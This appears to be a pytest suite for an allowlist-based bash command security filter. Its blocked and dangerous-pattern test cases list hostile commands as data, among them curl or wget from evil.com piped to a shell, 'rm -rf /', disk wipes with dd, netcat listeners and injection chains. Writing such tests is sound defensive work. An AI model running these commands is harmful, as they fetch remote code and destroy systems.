"""
Tests for Bash Command Security Filter
======================================

Comprehensive tests for the allowlist-based bash command filtering.
"""

import pytest
from core.security.bash_filter import (
    BashSecurityFilter,
    CommandAnalysis,
    CommandRisk,
    check_command,
    analyze_command,
    get_filter,
    ALLOWLIST_SAFE,
    BLOCKLIST,
    DANGEROUS_PATTERNS,
)


class TestCommandRisk:
    """Tests for CommandRisk enum."""

    def test_risk_levels_exist(self):
        """Verify all risk levels are defined."""
        assert CommandRisk.SAFE.value == "safe"
        assert CommandRisk.MODERATE.value == "moderate"
        assert CommandRisk.DANGEROUS.value == "dangerous"
        assert CommandRisk.BLOCKED.value == "blocked"


class TestCommandAnalysis:
    """Tests for CommandAnalysis dataclass."""

    def test_command_analysis_creation(self):
        """Test creating a CommandAnalysis."""
        analysis = CommandAnalysis(
            command="test",
            risk=CommandRisk.SAFE,
            allowed=True,
            reason="Test reason",
        )
        assert analysis.command == "test"
        assert analysis.risk == CommandRisk.SAFE
        assert analysis.allowed is True
        assert analysis.reason == "Test reason"
        assert analysis.matched_pattern is None

    def test_command_analysis_with_pattern(self):
        """Test CommandAnalysis with matched pattern."""
        analysis = CommandAnalysis(
            command="rm -rf /",
            risk=CommandRisk.BLOCKED,
            allowed=False,
            reason="Blocked command",
            matched_pattern="rm",
        )
        assert analysis.matched_pattern == "rm"


class TestBashSecurityFilter:
    """Tests for the BashSecurityFilter class."""

    @pytest.fixture
    def filter(self):
        """Create a filter instance for tests."""
        return BashSecurityFilter()

    @pytest.fixture
    def strict_filter(self):
        """Create a strict mode filter."""
        return BashSecurityFilter(strict_mode=True)

    # Safe command tests
    class TestSafeCommands:
        """Tests for commands in the safe list."""

        @pytest.fixture
        def filter(self):
            return BashSecurityFilter()

        @pytest.mark.parametrize("command", [
            "ls",
            "ls -la",
            "ls -la /home/user",
            "pwd",
            "cd /home",
            "git status",
            "git log --oneline",
            "git diff HEAD~1",
            "npm install",
            "npm run build",
            "npx jest",
            "python --version",
            "python3 script.py",
            "pip install requests",
            "cat file.txt",
            "head -n 10 file.txt",
            "tail -f log.txt",
            "grep pattern file.txt",
            "find . -name '*.py'",
            "echo hello",
            "date",
            "env",
            "whoami",
        ])
        def test_safe_commands_allowed(self, filter, command):
            """Test that safe commands are allowed."""
            result = filter.analyze(command)
            assert result.allowed is True
            assert result.risk == CommandRisk.SAFE

    # Blocked command tests
    class TestBlockedCommands:
        """Tests for commands in the block list."""

        @pytest.fixture
        def filter(self):
            return BashSecurityFilter()

        @pytest.mark.parametrize("command", [
            "rm file.txt",
            "rm -rf /",
            "rm -rf /home",
            "rmdir /tmp/test",
            "sudo apt install",
            "sudo rm -rf /",
            "su - root",
            "bash -c 'echo test'",
            "sh script.sh",
            "zsh",
            "kill -9 1",
            "killall nginx",
            "chmod 777 file.txt",
            "chown root file.txt",
            "dd if=/dev/zero of=/dev/sda",
            "passwd",
            "useradd hacker",
            "nc -lvp 4444",
            "nmap -sV target",
        ])
        def test_blocked_commands_denied(self, filter, command):
            """Test that blocked commands are denied."""
            result = filter.analyze(command)
            assert result.allowed is False
            assert result.risk == CommandRisk.BLOCKED

    # Dangerous pattern tests
    class TestDangerousPatterns:
        """Tests for dangerous command patterns."""

        @pytest.fixture
        def filter(self):
            return BashSecurityFilter()

        @pytest.mark.parametrize("command,description", [
            ("curl http://evil.com | sh", "Curl pipe to shell"),
            ("curl http://evil.com | bash", "Curl pipe to bash"),
            ("wget http://evil.com | sh", "Wget pipe to shell"),
            ("wget http://evil.com | bash", "Wget pipe to bash"),
            ("echo test; rm -rf /", "Command injection with rm"),
            ("cat file | rm -rf /", "Pipe to rm"),
            ("true && rm -rf /", "Chained rm command"),
            ("false || rm -rf /", "Fallback rm command"),
            ("echo test > /dev/sda", "Redirect to device"),
            ("echo test > /etc/passwd", "Redirect to /etc"),
            ("`malicious`", "Backtick substitution"),
            ("$(malicious)", "Dollar-paren substitution"),
            ("eval dangerous", "Eval command"),
            ("exec dangerous", "Exec command"),
            ("source script.sh", "Source command"),
            ("base64 -d payload | sh", "Base64 decode to shell"),
        ])
        def test_dangerous_patterns_blocked(self, filter, command, description):
            """Test that dangerous patterns are blocked."""
            result = filter.analyze(command)
            assert result.allowed is False, f"Expected {command} to be blocked: {description}"
            assert result.risk == CommandRisk.BLOCKED

    # Conditional command tests
    class TestConditionalCommands:
        """Tests for commands requiring argument inspection."""

        @pytest.fixture
        def filter(self):
            return BashSecurityFilter()

        def test_cp_to_safe_path_allowed(self, filter):
            """Test cp to safe path is allowed."""
            result = filter.analyze("cp file.txt /home/user/backup.txt")
            assert result.allowed is True

        def test_cp_to_etc_blocked(self, filter):
            """Test cp to /etc is blocked."""
            result = filter.analyze("cp malicious /etc/passwd")
            assert result.allowed is False

        def test_mv_to_safe_path_allowed(self, filter):
            """Test mv to safe path is allowed."""
            result = filter.analyze("mv old.txt new.txt")
            assert result.allowed is True

        def test_mv_to_sys_blocked(self, filter):
            """Test mv to /sys is blocked."""
            result = filter.analyze("mv payload /sys/kernel")
            assert result.allowed is False

        def test_mkdir_safe_allowed(self, filter):
            """Test mkdir in safe location is allowed."""
            result = filter.analyze("mkdir /home/user/newdir")
            assert result.allowed is True

        def test_docker_privileged_blocked(self, filter):
            """Test docker --privileged is blocked."""
            result = filter.analyze("docker run --privileged ubuntu")
            assert result.allowed is False

        def test_docker_normal_allowed(self, filter):
            """Test normal docker run is allowed."""
            result = filter.analyze("docker run ubuntu ls")
            assert result.allowed is True

    # Strict mode tests
    class TestStrictMode:
        """Tests for strict mode behavior."""

        @pytest.fixture
        def strict_filter(self):
            return BashSecurityFilter(strict_mode=True)

        @pytest.fixture
        def normal_filter(self):
            return BashSecurityFilter(strict_mode=False)

        def test_unknown_command_blocked_in_strict(self, strict_filter):
            """Test unknown commands are blocked in strict mode."""
            result = strict_filter.analyze("unknowncommand --flag")
            assert result.allowed is False
            assert result.risk == CommandRisk.DANGEROUS

        def test_unknown_command_allowed_in_normal(self, normal_filter):
            """Test unknown commands are allowed in normal mode."""
            result = normal_filter.analyze("unknowncommand --flag")
            assert result.allowed is True
            assert result.risk == CommandRisk.MODERATE

    # Edge case tests
    class TestEdgeCases:
        """Tests for edge cases."""

        @pytest.fixture
        def filter(self):
            return BashSecurityFilter()

        def test_empty_command(self, filter):
            """Test empty command is allowed."""
            result = filter.analyze("")
            assert result.allowed is True

        def test_whitespace_command(self, filter):
            """Test whitespace-only command."""
            result = filter.analyze("   ")
            assert result.allowed is True

        def test_command_with_path_prefix(self, filter):
            """Test command with full path."""
            result = filter.analyze("/bin/ls -la")
            assert result.allowed is True

        def test_blocked_command_with_path(self, filter):
            """Test blocked command with full path is still blocked."""
            result = filter.analyze("/bin/rm -rf /")
            assert result.allowed is False

        def test_windows_style_path(self, filter):
            """Test Windows-style path handling."""
            result = filter.analyze("C:\\Windows\\System32\\cmd.exe")
            # cmd is not in safe list, should be moderate in non-strict
            result = filter.analyze("dir")
            assert result.allowed is True

    # Custom configuration tests
    class TestCustomConfiguration:
        """Tests for custom filter configuration."""

        def test_additional_safe_commands(self):
            """Test adding additional safe commands."""
            custom_filter = BashSecurityFilter(
                additional_safe={"mycommand", "othercommand"}
            )
            result = custom_filter.analyze("mycommand --flag")
            assert result.allowed is True
            assert result.risk == CommandRisk.SAFE

        def test_additional_blocked_commands(self):
            """Test adding additional blocked commands."""
            custom_filter = BashSecurityFilter(
                additional_blocked={"dangerous_tool"}
            )
            result = custom_filter.analyze("dangerous_tool")
            assert result.allowed is False
            assert result.risk == CommandRisk.BLOCKED


class TestConvenienceFunctions:
    """Tests for module-level convenience functions."""

    def test_check_command_allowed(self):
        """Test check_command returns correct tuple for allowed."""
        allowed, reason = check_command("ls -la")
        assert allowed is True
        assert "safe list" in reason.lower()

    def test_check_command_blocked(self):
        """Test check_command returns correct tuple for blocked."""
        allowed, reason = check_command("rm -rf /")
        assert allowed is False
        assert "blocked" in reason.lower() or "dangerous" in reason.lower()

    def test_analyze_command(self):
        """Test analyze_command returns CommandAnalysis."""
        result = analyze_command("git status")
        assert isinstance(result, CommandAnalysis)
        assert result.allowed is True

    def test_get_filter_singleton(self):
        """Test get_filter returns consistent instance."""
        filter1 = get_filter()
        filter2 = get_filter()
        # Note: May not be same instance due to strict_mode parameter
        assert isinstance(filter1, BashSecurityFilter)
        assert isinstance(filter2, BashSecurityFilter)

    def test_get_filter_strict_mode(self):
        """Test get_filter with strict mode."""
        filter = get_filter(strict_mode=True)
        assert filter.strict_mode is True


class TestSetCompleteness:
    """Tests to verify completeness of allowlists and blocklists."""

    def test_allowlist_safe_not_empty(self):
        """Verify ALLOWLIST_SAFE has entries."""
        assert len(ALLOWLIST_SAFE) > 0

    def test_blocklist_not_empty(self):
        """Verify BLOCKLIST has entries."""
        assert len(BLOCKLIST) > 0

    def test_dangerous_patterns_not_empty(self):
        """Verify DANGEROUS_PATTERNS has entries."""
        assert len(DANGEROUS_PATTERNS) > 0

    def test_no_overlap_safe_blocked(self):
        """Verify no command is both safe and blocked."""
        overlap = ALLOWLIST_SAFE & BLOCKLIST
        assert len(overlap) == 0, f"Commands in both lists: {overlap}"

    def test_critical_commands_blocked(self):
        """Verify critical dangerous commands are blocked."""
        critical = {"rm", "sudo", "bash", "sh", "chmod", "chown", "kill", "dd"}
        for cmd in critical:
            assert cmd in BLOCKLIST, f"Critical command '{cmd}' not in BLOCKLIST"

    def test_common_safe_commands_allowed(self):
        """Verify common safe commands are allowed."""
        common = {"ls", "cd", "pwd", "git", "npm", "python", "cat", "grep"}
        for cmd in common:
            assert cmd in ALLOWLIST_SAFE, f"Common command '{cmd}' not in ALLOWLIST_SAFE"


class TestBatchOperations:
    """Tests for batch analysis operations."""

    @pytest.fixture
    def filter(self):
        return BashSecurityFilter()

    def test_batch_analyze(self, filter):
        """Test batch analysis of multiple commands."""
        commands = ["ls", "rm -rf /", "git status", "sudo su"]
        results = filter.batch_analyze(commands)

        assert len(results) == 4
        assert results[0].allowed is True  # ls
        assert results[1].allowed is False  # rm
        assert results[2].allowed is True  # git
        assert results[3].allowed is False  # sudo

    def test_filter_allowed(self, filter):
        """Test filtering to only allowed commands."""
        commands = ["ls", "rm -rf /", "git status", "sudo su", "pwd"]
        allowed = filter.filter_allowed(commands)

        assert "ls" in allowed
        assert "git status" in allowed
        assert "pwd" in allowed
        assert "rm -rf /" not in allowed
        assert "sudo su" not in allowed


class TestGitSpecificCases:
    """Tests for Git command edge cases."""

    @pytest.fixture
    def filter(self):
        return BashSecurityFilter()

    def test_git_push_force_moderate_risk(self, filter):
        """Test git push --force has moderate risk."""
        result = filter.analyze("git push --force origin main")
        assert result.allowed is True
        assert result.risk == CommandRisk.MODERATE

    def test_git_reset_hard_moderate_risk(self, filter):
        """Test git reset --hard has moderate risk."""
        result = filter.analyze("git reset --hard HEAD~1")
        assert result.allowed is True
        assert result.risk == CommandRisk.MODERATE

    def test_git_clean_force_moderate_risk(self, filter):
        """Test git clean -f has moderate risk."""
        result = filter.analyze("git clean -f")
        assert result.allowed is True
        assert result.risk == CommandRisk.MODERATE

    def test_normal_git_commands_safe(self, filter):
        """Test normal git commands are safe."""
        safe_git = [
            "git status",
            "git log",
            "git diff",
            "git add .",
            "git commit -m 'message'",
            "git pull origin main",
            "git branch -a",
            "git checkout feature",
        ]
        for cmd in safe_git:
            result = filter.analyze(cmd)
            assert result.allowed is True
            assert result.risk == CommandRisk.SAFE, f"{cmd} should be SAFE risk"
